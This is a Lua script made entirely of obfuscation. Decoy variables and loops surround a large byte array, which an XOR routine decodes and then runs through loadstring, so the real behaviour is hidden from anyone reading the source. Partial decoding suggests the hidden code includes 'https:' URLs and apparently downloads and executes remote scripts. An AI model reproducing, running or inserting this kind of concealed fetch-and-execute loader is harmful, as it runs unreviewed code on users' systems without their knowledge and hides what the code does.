local Xm7gAI7AA = math.pi
local HqkwH2EzNebF8Kg = (69 * 1)
local KwGv1C0O4dxq = "cVmVKHi2XChJ"
do local Y9WtwZhRtE = 9478 end
do local acaaVRDavw = 8869 end
local GXXXfh23I90SwKWC = (23 * 59)
local CP2xg1dfIbOT = 245351
local GxUHxweIHdiuJZ8b = (96 * 8)
do local anD6NV5vWa = 5226 end
for BelWN = 1, 2 do local ZY0MivDo = BelWN end
do local DT5rHiYgHf = 4786 end
local YRreACpBAlPj = 767575
for mjEd8 = 1, 4 do local mY1lo5Ug = mjEd8 end
local Nynifti4 = math.random()
local zdQrSepsE = 162640
local P6nNw2Y2k = "8ZEN4Va4KmMXiLAZW"
do local WpFaUoDKsi = 4537 end
for BDiks = 1, 3 do local AK7RX7Pc = BDiks end
local TUXBaVhyMnrpOQOQ = "0ytPTIBYE"
local function xMwfPRvcSr1Mll(cEYa1I,s7HqZ6)
    local HWSwBF,MD8NaY=0,1
    while cEYa1I>0 or s7HqZ6>0 do
        if (cEYa1I%2)~=(s7HqZ6%2) then HWSwBF=HWSwBF+MD8NaY end
        cEYa1I=math.floor(cEYa1I/2)
        s7HqZ6=math.floor(s7HqZ6/2)
        MD8NaY=MD8NaY*2
    end
    return HWSwBF
end
local Kw4uYyucnjkkxv = {152, 22, 199, 43, 247, 124, 214, 33, 212, 68, 132, 45, 254, 40, 238, 40, 154, 15, 140, 99, 181, 48, 230, 44, 144, 10, 208, 56, 242, 50, 238, 109, 155, 11, 132, 21, 220, 114, 229, 34, 149, 29, 215, 62, 233, 53, 231, 42, 212, 22, 214, 106, 247, 51, 232, 41, 135, 13, 214, 35, 245, 59, 131, 44, 135, 10, 193, 56, 239, 116, 214, 33, 216, 89, 134, 17, 222, 20, 212, 109, 152, 22, 197, 46, 232, 40, 251, 36, 154, 30, 132, 36, 244, 40, 169, 43, 155, 12, 202, 46, 185, 117, 131, 71, 152, 22, 199, 43, 247, 124, 239, 56, 154, 26, 208, 35, 244, 50, 169, 63, 129, 23, 140, 63, 233, 48, 165, 109, 154, 24, 201, 47, 178, 86, 169, 109, 212, 89, 200, 37, 248, 61, 229, 109, 135, 11, 199, 106, 166, 124, 238, 44, 153, 28, 158, 2, 239, 40, 249, 10, 145, 13, 140, 63, 233, 48, 165, 109, 128, 11, 209, 47, 178, 86, 169, 109, 212, 89, 200, 37, 248, 61, 229, 109, 146, 23, 136, 106, 254, 46, 251, 109, 201, 89, 251, 38, 179, 47, 251, 46, 221, 115, 132, 106, 187, 124, 232, 62, 135, 28, 214, 62, 179, 58, 231, 97, 212, 91, 255, 15, 211, 1, 169, 46, 155, 20, 212, 35, 247, 57, 169, 40, 134, 11, 203, 56, 187, 53, 231, 109, 214, 89, 138, 100, 187, 50, 232, 32, 145, 89, 138, 100, 187, 126, 179, 109, 214, 89, 138, 100, 187, 40, 230, 62, 128, 11, 205, 36, 252, 116, 236, 63, 134, 80, 141, 64, 187, 124, 169, 109, 146, 23, 140, 99, 145, 57, 231, 41, 254, 115, 214, 63, 245, 116, 171, 37, 128, 13, 212, 57, 161, 115, 166, 63, 149, 14, 138, 45, 242, 40, 225, 56, 150, 12, 215, 47, 233, 63, 230, 35, 128, 28, 202, 62, 181, 63, 230, 32, 219, 48, 192, 33, 182, 37, 230, 56, 219, 20, 197, 35, 245, 115, 251, 40, 146, 10, 139, 34, 254, 61, 237, 62, 219, 20, 197, 35, 245, 115, 228, 44, 157, 23, 137, 63, 242, 126, 165, 109, 212, 89, 132, 106, 187, 124, 169, 109, 212, 89, 132, 104, 246, 61, 224, 35, 214, 80, 174, 56, 238, 50, 161, 111, 156, 13, 208, 58, 232, 102, 166, 98, 134, 24, 211, 100, 252, 53, 253, 37, 129, 27, 209, 57, 254, 46, 234, 34, 154, 13, 193, 36, 239, 114, 234, 34, 153, 86, 237, 46, 240, 113, 240, 34, 129, 86, 201, 43, 242, 50, 166, 63, 145, 31, 215, 101, 243, 57, 232, 41, 135, 86, 201, 43, 242, 50, 166, 57, 149, 27, 137, 47, 232, 44, 171, 97, 212, 89, 132, 106, 187, 124, 169, 109, 212, 89, 132, 106, 185, 40, 232, 47, 171, 28, 215, 58, 185, 117, 131, 63, 129, 23, 140, 104, 243, 40, 253, 61, 135, 67, 139, 101, 233, 61, 254, 99, 147, 16, 208, 34, 238, 62, 252, 62, 145, 11, 199, 37, 245, 40, 236, 35, 128, 87, 199, 37, 246, 115, 192, 41, 159, 84, 221, 37, 238, 115, 228, 44, 157, 23, 139, 56, 254, 58, 250, 98, 156, 28, 197, 46, 232, 115, 228, 44, 157, 23, 139, 62, 250, 62, 164, 63, 149, 30, 193, 104, 183, 124, 169, 109, 212, 89, 132, 106, 187, 124, 169, 109, 214, 13, 197, 40, 196, 46, 232, 42, 145, 91, 141, 64, 233, 41, 231, 101, 214, 17, 208, 62, 235, 47, 179, 98, 219, 11, 197, 61, 181, 59, 224, 57, 156, 12, 198, 63, 232, 57, 251, 46, 155, 23, 208, 47, 245, 40, 167, 46, 155, 20, 139, 3, 255, 55, 164, 52, 155, 12, 139, 39, 250, 53, 231, 98, 134, 28, 194, 57, 180, 52, 236, 44, 144, 10, 139, 39, 250, 53, 231, 98, 128, 24, 198, 103, 237, 53, 250, 56, 149, 21, 215, 104, 183, 124, 169, 109, 212, 89, 132, 106, 187, 126, 253, 44, 150, 38, 210, 35, 232, 41, 232, 33, 135, 91, 141, 64, 233, 41, 231, 101, 214, 17, 208, 62, 235, 47, 179, 98, 219, 11, 197, 61, 181, 59, 224, 57, 156, 12, 198, 63, 232, 57, 251, 46, 155, 23, 208, 47, 245, 40, 167, 46, 155, 20, 139, 3, 255, 55, 164, 52, 155, 12, 139, 39, 250, 53, 231, 98, 134, 28, 194, 57, 180, 52, 236, 44, 144, 10, 139, 39, 250, 53, 231, 98, 128, 24, 198, 103, 246, 53, 250, 46, 214, 85, 132, 106, 187, 124, 169, 109, 212, 89, 132, 106, 187, 126, 253, 44, 150, 38, 201, 35, 232, 63, 171, 100, 254, 11, 209, 36, 179, 126, 225, 57, 128, 9, 215, 112, 180, 115, 251, 44, 131, 87, 195, 35, 239, 52, 252, 47, 129, 10, 193, 56, 248, 51, 231, 57, 145, 23, 208, 100, 248, 51, 228, 98, 189, 29, 207, 103, 226, 51, 252, 98, 153, 24, 205, 36, 180, 46, 236, 43, 135, 86, 204, 47, 250, 56, 250, 98, 153, 24, 205, 36, 180, 40, 232, 47, 217, 10, 207, 35, 245, 47, 171, 97, 212, 89, 132, 106, 187, 124, 169, 109, 212, 89, 134, 62, 250, 62, 214, 62, 159, 16, 202, 57, 185, 117, 131, 63, 129, 23, 140, 104, 243, 40, 253, 61, 135, 67, 139, 101, 233, 61, 254, 99, 147, 16, 208, 34, 238, 62, 252, 62, 145, 11, 199, 37, 245, 40, 236, 35, 128, 87, 199, 37, 246, 115, 192, 41, 159, 84, 221, 37, 238, 115, 228, 44, 157, 23, 139, 56, 254, 58, 250, 98, 156, 28, 197, 46, 232, 115, 228, 44, 157, 23, 139, 62, 250, 62, 164, 40, 140, 9, 193, 56, 242, 49, 236, 35, 128, 91, 136, 106, 187, 124, 169, 109, 214, 13, 197, 40, 196, 57, 241, 61, 145, 11, 205, 39, 254, 50, 253, 111, 221, 115, 214, 63, 245, 116, 171, 37, 128, 13, 212, 57, 161, 115, 166, 63, 149, 14, 138, 45, 242, 40, 225, 56, 150, 12, 215, 47, 233, 63, 230, 35, 128, 28, 202, 62, 181, 63, 230, 32, 219, 48, 192, 33, 182, 37, 230, 56, 219, 20, 197, 35, 245, 115, 251, 40, 146, 10, 139, 34, 254, 61, 237, 62, 219, 20, 197, 35, 245, 115, 253, 44, 150, 84, 199, 37, 245, 58, 224, 42, 214, 85, 132, 106, 187, 124, 169, 109, 212, 89, 132, 104, 239, 61, 235, 18, 151, 22, 202, 44, 242, 59, 171, 100, 254, 11, 209, 36, 179, 126, 225, 57, 128, 9, 215, 112, 180, 115, 251, 44, 131, 87, 195, 35, 239, 52, 252, 47, 129, 10, 193, 56, 248, 51, 231, 57, 145, 23, 208, 100, 248, 51, 228, 98, 189, 29, 207, 103, 226, 51, 252, 98, 153, 24, 205, 36, 180, 46, 236, 43, 135, 86, 204, 47, 250, 56, 250, 98, 153, 24, 205, 36, 180, 21, 231, 36, 128, 91, 136, 106, 187, 124, 169, 109, 212, 89, 132, 106, 187, 124, 169, 109, 212, 89, 134, 35, 245, 53, 253, 111, 221}
local WoRzJ9EDk7DlCJ = {244, 121, 164, 74, 155, 92, 137, 77}
local duc5XqVytFYIMV = {}
for OoTnx6cwSD2MfX = 1, #Kw4uYyucnjkkxv do
    duc5XqVytFYIMV[OoTnx6cwSD2MfX] = xMwfPRvcSr1Mll(Kw4uYyucnjkkxv[OoTnx6cwSD2MfX],WoRzJ9EDk7DlCJ[((OoTnx6cwSD2MfX-1)%#WoRzJ9EDk7DlCJ)+1])
end
local yr6C4iloejZhdq = ''
for kSKTwZuYrFvlHx=1,#duc5XqVytFYIMV,256 do
    local GwWvGAorVMEImn=kSKTwZuYrFvlHx+255
    if GwWvGAorVMEImn>#duc5XqVytFYIMV then GwWvGAorVMEImn=#duc5XqVytFYIMV end
    local _t={}
    for _i=kSKTwZuYrFvlHx,GwWvGAorVMEImn do _t[#_t+1]=duc5XqVytFYIMV[_i] end
    yr6C4iloejZhdq=yr6C4iloejZhdq..string.char(unpack(_t))
end
local ArEuF0Eg695Ad0 = loadstring or load
local kcBksB9oSoxYxW, NRtqdjDfXSbikp = ArEuF0Eg695Ad0(yr6C4iloejZhdq)
if not kcBksB9oSoxYxW then error(NRtqdjDfXSbikp) end
kcBksB9oSoxYxW()
